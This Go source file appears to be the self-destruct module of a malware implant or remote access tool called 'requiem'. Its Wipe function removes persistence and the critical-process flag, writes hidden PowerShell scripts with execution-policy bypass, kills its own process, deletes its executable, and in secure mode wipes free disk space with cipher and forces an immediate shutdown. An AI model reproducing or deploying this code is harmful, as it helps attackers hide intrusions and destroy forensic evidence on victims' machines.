package funcs

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"requiem/persistence"
	"requiem/store"
	"requiem/utils"
)

func Wipe(secure bool) {
	persistence.Unpersist()

	utils.RemoveMutex()

	SetCritical(false)

	var wipe strings.Builder
	wipe.WriteString("sleep 1\n")
	fmt.Fprintf(&wipe, "kill -Id %d -Force\n", os.Getpid())
	fmt.Fprintf(&wipe, "attrib -h -s \"%s\"\n", store.ExecPath)
	fmt.Fprintf(&wipe, "rm -fo '%s'\n", store.ExecPath)

	if secure {
		var cipher strings.Builder

		cipherName := fmt.Sprintf("%dp.ps1", time.Now().UnixNano())
		cipherPath := filepath.Join(os.TempDir(), cipherName)

		cipher.WriteString("cipher /w:C\n")
		cipher.WriteString("shutdown /s /f /t 0\n")
		fmt.Fprintf(&cipher, "rm -fo '%s'\n", cipherPath)

		err := os.WriteFile(cipherPath, []byte(cipher.String()), 0666)
		if err != nil {
			return
		}

		fmt.Fprintf(&wipe, "start powershell -Args '-nop -w hidden -ep bypass -file \"%s\"' -w hidden\n", cipherPath)
	}

	wipeName := fmt.Sprintf("%d.ps1", time.Now().UnixNano())
	wipePath := filepath.Join(os.TempDir(), wipeName)

	fmt.Fprintf(&wipe, "rm -fo '%s'\n", wipePath)

	err := os.WriteFile(wipePath, []byte(wipe.String()), 0666)
	if err != nil {
		return
	}

	cmd := utils.StartCommand("powershell", "-nop", "-w", "hidden", "-ep", "bypass", "-file", wipePath)
	cmd.Start()

	os.Exit(0)
}
